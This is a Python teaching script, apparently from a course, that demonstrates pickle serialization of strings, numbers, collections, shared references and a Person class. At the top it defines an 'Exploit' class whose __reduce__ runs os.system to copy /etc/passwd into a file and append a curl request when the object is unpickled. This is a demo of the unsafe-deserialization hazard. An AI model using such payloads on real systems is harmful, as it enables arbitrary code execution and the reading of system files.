import os
import pickle


class Exploit():
  def __reduce__(self):
    return (os.system, ('cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt', ))

def serialize_exploit(fname):
  with open(fname, 'wb') as f:
    pickle.dump(Exploit(), f)

# serialize_exploit('loadme')

# import pickle
# b = pickle.load(open('loadme', 'rb'))
# print(b)

import pickle
# Strings
ser = pickle.dumps('Python Pickle Peppers')
print(ser)
deser = pickle.loads(ser)
print(deser)

# Numbers

ser = pickle.dumps(3.14)
print(ser)
deser = pickle.loads(ser)
print(deser)

# lists

d = [1, 20, ('a', 'b', 30)]
ser = pickle.dumps(d)
print(ser)
deser = pickle.loads(ser)
print(deser)
print(f'id(d) - {id(d)}, id(deser) - {id(deser)}')
print(deser == d) # they are equal objs, but not same

# sets

s = {'a', 'b', 'x', 10}
ser = pickle.dumps(s)
print(ser)

deser = pickle.loads(ser)
print(deser)

# dicts 
d = {'b': 1, 'a': 2, 'c': {'x': 10, 'y': 20}}

ser = pickle.dumps(d)
print('ser - ', ser)
deser = pickle.loads(ser)
print('deser - ', deser)

print(d is deser,d == deser)

############################
d1 = {'a': 10, 'b': 20}
d2 = {'x': 100, 'y': d1, 'z': d1}
ser = pickle.dumps(d2)
d3 = pickle.loads(ser)
print(d2, '\n', d3)

print(d3['y'] == d2['y'])

print(d3['y'] is d2['y'])

#############################

d1 = {'a': 1, 'b': 2}
d2 = {'x': 10, 'y': d1}
print(d1)
print(d2)
d1['c'] = 3
print(d1)
print(d2)

d1 = {'a': 1, 'b': 2}
d2 = {'x': 10, 'y': d1}
d1_ser = pickle.dumps(d1)
d2_ser = pickle.dumps(d2)

# simulate exiting the program, or maybe just restarting the notebook
del d1
del d2

# load the data back up
d1 = pickle.loads(d1_ser)
d2 = pickle.loads(d2_ser)

# and continue processing as before
print(d1)
print(d2)
d1['c'] = 3
print(d1)
print(d2)


#################
d1 = {'a': 1, 'b': 2}
d2 = {'x': 100, 'y': d1, 'z': d1}
ser = pickle.dumps(d2)
del d1
del d2
deser = pickle.loads(ser)
print(deser['y'] is deser['z'])

class Person:
  def __init__(self, name, age):
    self.name = name
    self.age = age
  
  def __eq__(self, other):
    return self.name == other.name and self.age == other.age
  
  def __repr__(self):
    return f"Person(name={self.name}, age={self.age})"



john = Person('John Cleese', 79)
eric = Person('Eric Idle', 75)
michael = Person('Michael Palin', 75)

parrot_sketch = {
    "title": "Parrot Sketch",
    "actors": [john, michael]
}

ministry_sketch = {
    "title": "Ministry of Silly Walks",
    "actors": [john, michael]
}

joke_sketch = {
    "title": "Funniest Joke in the World",
    "actors": [eric, michael]
}


fan_favorites = {
    "user_1": [parrot_sketch, joke_sketch],
    "user_2": [parrot_sketch, ministry_sketch]
}

from pprint import pprint

pprint(fan_favorites)

print(fan_favorites['user_1'][0] is fan_favorites['user_2'][0]
)

parrot_id_original = id(parrot_sketch)

ser = pickle.dumps(fan_favorites)
new_fan_favorites = pickle.loads(ser)
print(fan_favorites == new_fan_favorites)

print(id(fan_favorites['user_1'][0]), id(new_fan_favorites['user_1'][0])
)

print(new_fan_favorites['user_1'][0] is new_fan_favorites['user_2'][0]
)